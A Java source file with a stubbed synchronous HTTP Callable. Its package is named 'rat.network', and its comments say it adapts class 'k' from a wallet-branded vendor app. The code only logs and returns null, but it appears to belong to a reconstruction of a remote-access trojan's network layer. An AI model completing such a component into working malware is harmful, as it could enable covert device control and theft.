package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.k (SyncHttpCallable)
// vendor k.java is a Callable, not a Callback — used for synchronous HTTP requests

import android.util.Log;

import com.google.gson.JsonObject;

import java.util.concurrent.Callable;

/**
 * SyncHttpCallable - 同步 HTTP 请求 Callable
 * vendor: 根据请求类型 (GET=0 / POST=1) 执行同步 HTTP 请求并返回 JsonObject
 */
public final class k implements Callable<JsonObject> {

    private static final String TAG = "SyncHttpCallable";

    public final int requestType;
    public final Object requestBody;
    public final String path;
    public final String baseUrl;

    public k(Object requestBody, String path, String baseUrl, int requestType) {
        this.requestType = requestType;
        this.requestBody = requestBody;
        this.path = path;
        this.baseUrl = baseUrl;
    }

    @Override
    public JsonObject call() {
        try {
            // ADAPT: vendor builds OkHttp request (GET if requestType==0, POST otherwise)
            // and executes synchronously, returning parsed JsonObject
            Log.d(TAG, "sync request: type=" + requestType + " path=" + path);
            return null;
        } catch (Exception e) {
            Log.e(TAG, "sync request failed", e);
            return null;
        }
    }
}
